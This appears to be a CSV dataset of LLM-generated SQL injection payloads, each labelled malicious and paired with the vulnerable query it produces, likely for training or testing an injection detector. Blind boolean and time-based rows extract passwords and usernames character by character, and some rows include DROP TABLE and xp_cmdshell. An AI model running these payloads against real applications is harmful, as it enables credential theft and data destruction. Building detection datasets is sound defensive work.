attack_category,template_context,payload,full_query,label,source,generator_model,round
blind_boolean,search,1' AND (SELECT NULL FROM information_schema.tables WHERE table_name LIKE '%users%') IS NULL--,SELECT * FROM products WHERE name LIKE '%1' AND (SELECT NULL FROM information_schema.tables WHERE table_name LIKE '%users%') IS NULL--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,search,"1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))=97--","SELECT * FROM products WHERE name LIKE '%1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))=97--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,search,"1' AND 1=(SELECT CASE WHEN (ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=97) THEN 1 ELSE 0 END)--","SELECT * FROM products WHERE name LIKE '%1' AND 1=(SELECT CASE WHEN (ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=97) THEN 1 ELSE 0 END)--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,search,"1' AND EXISTS(SELECT 1 FROM users WHERE id=1 AND ASCII(SUBSTRING(username,1,1)) BETWEEN ASCII('a') AND ASCII('z'))--","SELECT * FROM products WHERE name LIKE '%1' AND EXISTS(SELECT 1 FROM users WHERE id=1 AND ASCII(SUBSTRING(username,1,1)) BETWEEN ASCII('a') AND ASCII('z'))--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,search,"1' AND 1=(SELECT 1 FROM users WHERE id=1 AND name LIKE CONCAT('%',(CHAR(97)),'%'))--","SELECT * FROM products WHERE name LIKE '%1' AND 1=(SELECT 1 FROM users WHERE id=1 AND name LIKE CONCAT('%',(CHAR(97)),'%'))--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,search,"1' AND 1 IN (SELECT 1 FROM users WHERE id=1 AND SUBSTRING(name,1,1)=CHAR(97))--","SELECT * FROM products WHERE name LIKE '%1' AND 1 IN (SELECT 1 FROM users WHERE id=1 AND SUBSTRING(name,1,1)=CHAR(97))--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,search,"1' AND (SELECT CAST(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1 LIMIT 1),1,1)) AS CHAR) = 'a'--","SELECT * FROM products WHERE name LIKE '%1' AND (SELECT CAST(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1 LIMIT 1),1,1)) AS CHAR) = 'a'--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,search,--' AND (SELECT 0 FROM product_info WHERE price > (SELECT AVG(price) FROM products)) --,SELECT * FROM products WHERE name LIKE '%--' AND (SELECT 0 FROM product_info WHERE price > (SELECT AVG(price) FROM products)) --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,search,"/*' AND 1=2 UNION SELECT NULL,NULL,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='store_db'),NULL--","SELECT * FROM products WHERE name LIKE '%/*' AND 1=2 UNION SELECT NULL,NULL,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='store_db'),NULL--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,search,"' AND ascii(substring((SELECT group_concat(password) FROM user_accounts),1,1))>97--","SELECT * FROM products WHERE name LIKE '%' AND ascii(substring((SELECT group_concat(password) FROM user_accounts),1,1))>97--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,search,"%' AND EXISTS(SELECT 1 FROM inventory WHERE item_id LIKE concat('%', (CHAR(98)), '%'))--","SELECT * FROM products WHERE name LIKE '%%' AND EXISTS(SELECT 1 FROM inventory WHERE item_id LIKE concat('%', (CHAR(98)), '%'))--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,search,"' AND (SELECT cast(ascii(substring((SELECT product_code FROM orders WHERE order_id=1),1,1)) AS char)=char(99)--","SELECT * FROM products WHERE name LIKE '%' AND (SELECT cast(ascii(substring((SELECT product_code FROM orders WHERE order_id=1),1,1)) AS char)=char(99)--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,user_lookup,--' AND EXISTS(SELECT 1 FROM users WHERE username LIKE '%admin%')--,SELECT * FROM users WHERE id = --' AND EXISTS(SELECT 1 FROM users WHERE username LIKE '%admin%')--,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,user_lookup,'; WAITFOR DELAY '0:0:10' AND 1=1; --,SELECT * FROM users WHERE id = '; WAITFOR DELAY '0:0:10' AND 1=1; --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,user_lookup,--' AND (SELECT CASE WHEN 1=1 THEN CAST(ASCII((SELECT username FROM users WHERE id=1)) AS VARCHAR) ELSE NULL END)=',SELECT * FROM users WHERE id = --' AND (SELECT CASE WHEN 1=1 THEN CAST(ASCII((SELECT username FROM users WHERE id=1)) AS VARCHAR) ELSE NULL END)=',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,user_lookup,"' OR 1=1 AND EXISTS(SELECT 1 FROM users WHERE id=(SELECT IF(SUBSTRING(username, 1, 1)='a', 1, 0)))--","SELECT * FROM users WHERE id = ' OR 1=1 AND EXISTS(SELECT 1 FROM users WHERE id=(SELECT IF(SUBSTRING(username, 1, 1)='a', 1, 0)))--",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,user_lookup,%' AND (SELECT COUNT(*) FROM users WHERE id IN (SELECT id FROM users WHERE username COLLATE utf8mb4_bin LIKE 'a%')) > 0 --,SELECT * FROM users WHERE id = %' AND (SELECT COUNT(*) FROM users WHERE id IN (SELECT id FROM users WHERE username COLLATE utf8mb4_bin LIKE 'a%')) > 0 --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,user_lookup,"' AND ASCII(SUBSTRING((SELECT GROUP_CONCAT(username ORDER BY id), 1, 1)) & 0x80 > 0 --","SELECT * FROM users WHERE id = ' AND ASCII(SUBSTRING((SELECT GROUP_CONCAT(username ORDER BY id), 1, 1)) & 0x80 > 0 --",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,user_lookup,"--' AND (SELECT ASCII(SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1)) & 0x80 > 0","SELECT * FROM users WHERE id = --' AND (SELECT ASCII(SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1)) & 0x80 > 0",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,user_lookup,"' OR 1=1 AND SUBSTR((SELECT password FROM users WHERE id=1), 1, 1)='a'","SELECT * FROM users WHERE id = ' OR 1=1 AND SUBSTR((SELECT password FROM users WHERE id=1), 1, 1)='a'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,user_lookup,--' AND (SELECT COUNT(*) FROM users WHERE username LIKE '_%' AND LENGTH(username)=2)>0,SELECT * FROM users WHERE id = --' AND (SELECT COUNT(*) FROM users WHERE username LIKE '_%' AND LENGTH(username)=2)>0,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,user_lookup,"--' AND (SELECT ASCII(SUBSTRING((SELECT CONCAT(id, username) FROM users WHERE id=1), 1, 1)) & 0x80 > 0","SELECT * FROM users WHERE id = --' AND (SELECT ASCII(SUBSTRING((SELECT CONCAT(id, username) FROM users WHERE id=1), 1, 1)) & 0x80 > 0",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,user_lookup,"' AND (SELECT IF(SUM(CASE WHEN username LIKE 'admin%' THEN 1 ELSE 0 END), 'true', 'false') FROM users)='true'","SELECT * FROM users WHERE id = ' AND (SELECT IF(SUM(CASE WHEN username LIKE 'admin%' THEN 1 ELSE 0 END), 'true', 'false') FROM users)='true'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,order_filter,1; WAITFOR DELAY '0:0:5';--,SELECT * FROM orders WHERE status = '1; WAITFOR DELAY '0:0:5';--' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,order_filter,1' LIKE '1'%,SELECT * FROM orders WHERE status = '1' LIKE '1'%' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,order_filter,/*'*/AND 1=1 /*comment*/,SELECT * FROM orders WHERE status = '/*'*/AND 1=1 /*comment*/' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,order_filter,' AND 1=1 OR 1=1 --,SELECT * FROM orders WHERE status = '' AND 1=1 OR 1=1 --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,order_filter,' AND (SELECT 1 FROM users WHERE username = '') = 1,SELECT * FROM orders WHERE status = '' AND (SELECT 1 FROM users WHERE username = '') = 1' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,order_filter,' AND 1<>(CASE WHEN (SELECT COUNT(*) FROM users WHERE id = 1) THEN 1 ELSE 0 END) --,SELECT * FROM orders WHERE status = '' AND 1<>(CASE WHEN (SELECT COUNT(*) FROM users WHERE id = 1) THEN 1 ELSE 0 END) --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,order_filter,' LIKE '%admin%',SELECT * FROM orders WHERE status = '' LIKE '%admin%'' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,order_filter,/*'*/ AND 1=1 /*comment*/,SELECT * FROM orders WHERE status = '/*'*/ AND 1=1 /*comment*/' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,order_filter,AND EXISTS(SELECT * FROM users WHERE status = 'active') --,SELECT * FROM orders WHERE status = 'AND EXISTS(SELECT * FROM users WHERE status = 'active') --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,order_filter,OR (SELECT 1 UNION ALL SELECT CASE WHEN (SELECT username FROM users WHERE id = 1) = 'admin' THEN 1 ELSE 0 END),SELECT * FROM orders WHERE status = 'OR (SELECT 1 UNION ALL SELECT CASE WHEN (SELECT username FROM users WHERE id = 1) = 'admin' THEN 1 ELSE 0 END)' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,comment_insert,"["";--"", ""--;"", """"""', 1)"", ""/*'""]), (""1'/*"", ""1'))""), (""1'#"", "";--""), (""1' OR '1'='1"", ""--;""], (""1'; DROP TABLE users --"", ""1') UNION SELECT NULL, NULL--"")]","INSERT INTO comments (user_id, body) VALUES (1, '["";--"", ""--;"", """"""', 1)"", ""/*'""]), (""1'/*"", ""1'))""), (""1'#"", "";--""), (""1' OR '1'='1"", ""--;""], (""1'; DROP TABLE users --"", ""1') UNION SELECT NULL, NULL--"")]')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,comment_insert,1' AND EXISTS (SELECT * FROM users WHERE 1=1),"INSERT INTO comments (user_id, body) VALUES (1, '1' AND EXISTS (SELECT * FROM users WHERE 1=1)')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,comment_insert,1' AND 1=(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END) --,"INSERT INTO comments (user_id, body) VALUES (1, '1' AND 1=(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,comment_insert,1'); WAITFOR DELAY '0:0:5' AND ('%,"INSERT INTO comments (user_id, body) VALUES (1, '1'); WAITFOR DELAY '0:0:5' AND ('%')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,comment_insert,1' XOR 1=1 --,"INSERT INTO comments (user_id, body) VALUES (1, '1' XOR 1=1 --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,comment_insert,1' LIKE '%' --,"INSERT INTO comments (user_id, body) VALUES (1, '1' LIKE '%' --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,login,'; WAITFOR DELAY '0:0:3' IF USER_ID() = 1;--,SELECT * FROM users WHERE username = ''; WAITFOR DELAY '0:0:3' IF USER_ID() = 1;--' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,login,1')) AND SLEEP(5) AND (1=1 --,SELECT * FROM users WHERE username = '1')) AND SLEEP(5) AND (1=1 --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,login,"' OR 1>1 UNION ALL SELECT NULL, NULL, NULL FROM DUAL #","SELECT * FROM users WHERE username = '' OR 1>1 UNION ALL SELECT NULL, NULL, NULL FROM DUAL #' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,login,"'); BENCHMARK(1000000, md5('123')) AND ('1'='1","SELECT * FROM users WHERE username = ''); BENCHMARK(1000000, md5('123')) AND ('1'='1' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,login,"/*'*/and benchmark(1000000,'a');--","SELECT * FROM users WHERE username = '/*'*/and benchmark(1000000,'a');--' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,login,')); IF OBJECT_ID('tempdb..#t') IS NULL CREATE TABLE #t(x INT); INSERT INTO #t VALUES(1); DECLARE @x INT = (SELECT COUNT(*) FROM #t); IF @x > 0 WAITFOR DELAY '0:0:@x'; --,SELECT * FROM users WHERE username = '')); IF OBJECT_ID('tempdb..#t') IS NULL CREATE TABLE #t(x INT); INSERT INTO #t VALUES(1); DECLARE @x INT = (SELECT COUNT(*) FROM #t); IF @x > 0 WAITFOR DELAY '0:0:@x'; --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,login,""")) AND DBMS_PIPE.RECEIVE_MESSAGE(DBMS_CRYPTO.HASH_TO_RAW('attack',DBMS_CRYPTO.HASH_SH256),5)=DBMS_PIPE.RECEIVE_MESSAGE(DBMS_CRYPTO.HASH_TO_RAW('attack',DBMS_CRYPTO.HASH_SH256),5) --","SELECT * FROM users WHERE username = '"")) AND DBMS_PIPE.RECEIVE_MESSAGE(DBMS_CRYPTO.HASH_TO_RAW('attack',DBMS_CRYPTO.HASH_SH256),5)=DBMS_PIPE.RECEIVE_MESSAGE(DBMS_CRYPTO.HASH_TO_RAW('attack',DBMS_CRYPTO.HASH_SH256),5) --' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,login,'; WAITFOR DELAY '0:0:2' IF EXISTS(SELECT 1 FROM users WHERE username LIKE 'admin') --,SELECT * FROM users WHERE username = ''; WAITFOR DELAY '0:0:2' IF EXISTS(SELECT 1 FROM users WHERE username LIKE 'admin') --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,login,"1' OR ASCII(SUBSTRING(username, 1, 1)) > 97 AND BENCHMARK(1000000, ' ') --","SELECT * FROM users WHERE username = '1' OR ASCII(SUBSTRING(username, 1, 1)) > 97 AND BENCHMARK(1000000, ' ') --' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,login,' OR 1=1 AND SLEEP(2) AND '%'='%,SELECT * FROM users WHERE username = '' OR 1=1 AND SLEEP(2) AND '%'='%' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,login,/*'*/AND ( SELECT 1 FROM information_schema.tables WHERE table_schema = DATABASE() AND table_name = 'users' ) --,SELECT * FROM users WHERE username = '/*'*/AND ( SELECT 1 FROM information_schema.tables WHERE table_schema = DATABASE() AND table_name = 'users' ) --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,search,1' AND (SELECT 1 FROM information_schema.tables WHERE table_name='users') = 1 --,SELECT * FROM products WHERE name LIKE '%1' AND (SELECT 1 FROM information_schema.tables WHERE table_name='users') = 1 --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,search,"1""; WAITFOR DELAY '0:0:10'; --","SELECT * FROM products WHERE name LIKE '%1""; WAITFOR DELAY '0:0:10'; --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,search,1' OR 1=1; IF (CHAR_LENGTH(SELECT 1))=1 THEN SLEEP(5); --,SELECT * FROM products WHERE name LIKE '%1' OR 1=1; IF (CHAR_LENGTH(SELECT 1))=1 THEN SLEEP(5); --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,search,' AND (SELECT SLEEP(5) FROM users WHERE username='admin') --,SELECT * FROM products WHERE name LIKE '%' AND (SELECT SLEEP(5) FROM users WHERE username='admin') --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,search,"' OR (CAST(SUBSTRING((SELECT version()), 1, 1) AS UNSIGNED) > 5) --","SELECT * FROM products WHERE name LIKE '%' OR (CAST(SUBSTRING((SELECT version()), 1, 1) AS UNSIGNED) > 5) --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,search,"' AND (BENCHMARK(1000000, (SELECT 1))) --","SELECT * FROM products WHERE name LIKE '%' AND (BENCHMARK(1000000, (SELECT 1))) --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,search,""" OR EXISTS(SELECT * FROM information_schema.tables WHERE table_schema='database_name' AND table_name='users') --","SELECT * FROM products WHERE name LIKE '%"" OR EXISTS(SELECT * FROM information_schema.tables WHERE table_schema='database_name' AND table_name='users') --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,search,"' OR (ASCII(SUBSTRING((SELECT user()), 1, 1)) = 97) --","SELECT * FROM products WHERE name LIKE '%' OR (ASCII(SUBSTRING((SELECT user()), 1, 1)) = 97) --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,search,' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 1/0 END --,SELECT * FROM products WHERE name LIKE '%' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 1/0 END --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,search,"' OR ASCII(SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1)) = (SELECT ASCII('a')) --","SELECT * FROM products WHERE name LIKE '%' OR ASCII(SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1)) = (SELECT ASCII('a')) --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,search,"--' OR BENCHMARK(1000000, SELECT 1) --'","SELECT * FROM products WHERE name LIKE '%--' OR BENCHMARK(1000000, SELECT 1) --'%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,search,"' UNION SELECT NULL, NULL, NULL, BENCHMARK(1000000, CONCAT(user(), ':', host())) FROM mysql.user --","SELECT * FROM products WHERE name LIKE '%' UNION SELECT NULL, NULL, NULL, BENCHMARK(1000000, CONCAT(user(), ':', host())) FROM mysql.user --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,user_lookup,' OR 1=1 AND SLEEP(5),SELECT * FROM users WHERE id = ' OR 1=1 AND SLEEP(5),1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,user_lookup,"-- OR 1=1 AND BENCHMARK(1000000,MD5('a'))","SELECT * FROM users WHERE id = -- OR 1=1 AND BENCHMARK(1000000,MD5('a'))",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,user_lookup,' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') > 0 AND SLEEP(5),SELECT * FROM users WHERE id = ' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') > 0 AND SLEEP(5),1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,user_lookup,"-- OR (SELECT BENCHMARK(1000000,'sha1(a')) = 1 AND '1' = '1'","SELECT * FROM users WHERE id = -- OR (SELECT BENCHMARK(1000000,'sha1(a')) = 1 AND '1' = '1'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,user_lookup,"' OR '1' = '1' UNION ALL SELECT NULL, (SELECT USER()), NULL, NULL#","SELECT * FROM users WHERE id = ' OR '1' = '1' UNION ALL SELECT NULL, (SELECT USER()), NULL, NULL#",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,user_lookup,"' OR 1=1 AND (SELECT SUBSTRING(SLEEP(5),1,1)) >= 0","SELECT * FROM users WHERE id = ' OR 1=1 AND (SELECT SUBSTRING(SLEEP(5),1,1)) >= 0",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,user_lookup,"' OR EXISTS(SELECT * FROM users WHERE id>0 AND (SELECT ASCII(SUBSTRING(PASSWORD,1,1)) FROM users LIMIT 1) > 0 AND SLEEP(5)","SELECT * FROM users WHERE id = ' OR EXISTS(SELECT * FROM users WHERE id>0 AND (SELECT ASCII(SUBSTRING(PASSWORD,1,1)) FROM users LIMIT 1) > 0 AND SLEEP(5)",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,user_lookup,' OR 2=2; WAITFOR DELAY '0:0:5',SELECT * FROM users WHERE id = ' OR 2=2; WAITFOR DELAY '0:0:5',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,user_lookup,"'; SELECT benchmark(1000000,'md5(a'))--","SELECT * FROM users WHERE id = '; SELECT benchmark(1000000,'md5(a'))--",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,user_lookup,"' OR 4=4 AND EXISTS(SELECT * FROM users WHERE id<0 AND (SELECT ord(mid(password,1,1)) FROM users LIMIT 1) < 123)","SELECT * FROM users WHERE id = ' OR 4=4 AND EXISTS(SELECT * FROM users WHERE id<0 AND (SELECT ord(mid(password,1,1)) FROM users LIMIT 1) < 123)",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,order_filter,' OR (SELECT 1 FROM users WHERE username = 'admin') -- ',SELECT * FROM orders WHERE status = '' OR (SELECT 1 FROM users WHERE username = 'admin') -- '' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,order_filter,/* WAITFOR DELAY '0:0:5' */ AND 1=1,SELECT * FROM orders WHERE status = '/* WAITFOR DELAY '0:0:5' */ AND 1=1' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,order_filter,"BENCHMARK(1000000, SHA2('payload', 256)) --","SELECT * FROM orders WHERE status = 'BENCHMARK(1000000, SHA2('payload', 256)) --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,order_filter,"' AND IF((SELECT ASCII(SUBSTRING(status, 1, 1)) FROM orders WHERE id=1), SLEEP(5), NULL) --","SELECT * FROM orders WHERE status = '' AND IF((SELECT ASCII(SUBSTRING(status, 1, 1)) FROM orders WHERE id=1), SLEEP(5), NULL) --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,order_filter,' AND EXISTS(SELECT 1 FROM orders WHERE status LIKE '%admin%') AND '%'=',SELECT * FROM orders WHERE status = '' AND EXISTS(SELECT 1 FROM orders WHERE status LIKE '%admin%') AND '%'='' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,order_filter,"' UNION ALL SELECT NULL, NULL, NULL, NULL FROM (SELECT 1) WHERE 1=(SELECT Sleep(3)) #","SELECT * FROM orders WHERE status = '' UNION ALL SELECT NULL, NULL, NULL, NULL FROM (SELECT 1) WHERE 1=(SELECT Sleep(3)) #' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,order_filter,' AND (SELECT 1 FROM (SELECT 1 FROM users WHERE username='testuser')) = 0 AND '%'='%,SELECT * FROM orders WHERE status = '' AND (SELECT 1 FROM (SELECT 1 FROM users WHERE username='testuser')) = 0 AND '%'='%' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,order_filter,' AND (SELECT 1 FROM users WHERE username = 'admin') --,SELECT * FROM orders WHERE status = '' AND (SELECT 1 FROM users WHERE username = 'admin') --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,order_filter,"' OR (SELECT benchmark(1000000, sha2('payload', 256))) --","SELECT * FROM orders WHERE status = '' OR (SELECT benchmark(1000000, sha2('payload', 256))) --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,order_filter,' OR EXISTS(SELECT 1 FROM orders WHERE status LIKE '%admin%') AND '%'=',SELECT * FROM orders WHERE status = '' OR EXISTS(SELECT 1 FROM orders WHERE status LIKE '%admin%') AND '%'='' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,comment_insert,"AND DBMS_PIPE.RECEIVE_MESSAGE('BOE', 5) FROM DUAL --","INSERT INTO comments (user_id, body) VALUES (1, 'AND DBMS_PIPE.RECEIVE_MESSAGE('BOE', 5) FROM DUAL --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,comment_insert,WAITFOR DELAY '0:0:5' --,"INSERT INTO comments (user_id, body) VALUES (1, 'WAITFOR DELAY '0:0:5' --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,comment_insert,"-- OR BENCHMARK(1000000, MD5('test'))","INSERT INTO comments (user_id, body) VALUES (1, '-- OR BENCHMARK(1000000, MD5('test'))')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,comment_insert,; WAITFOR DELAY '0:0:5' WHERE USER() LIKE 'admin',"INSERT INTO comments (user_id, body) VALUES (1, '; WAITFOR DELAY '0:0:5' WHERE USER() LIKE 'admin'')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,comment_insert,"-- + AND EXISTS(SELECT * FROM sysobjects WHERE id = object_id(N'dbo.sysusers') AND type IN (N'SU', N'G'))","INSERT INTO comments (user_id, body) VALUES (1, '-- + AND EXISTS(SELECT * FROM sysobjects WHERE id = object_id(N'dbo.sysusers') AND type IN (N'SU', N'G'))')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,comment_insert,"' OR 1=1 -- ""; EXEC xp_cmdshell 'ping -n 5 localhost'","INSERT INTO comments (user_id, body) VALUES (1, '' OR 1=1 -- ""; EXEC xp_cmdshell 'ping -n 5 localhost'')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,login,"; WAITFOR DELAY '0:0:10'; --""","SELECT * FROM users WHERE username = '; WAITFOR DELAY '0:0:10'; --""' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
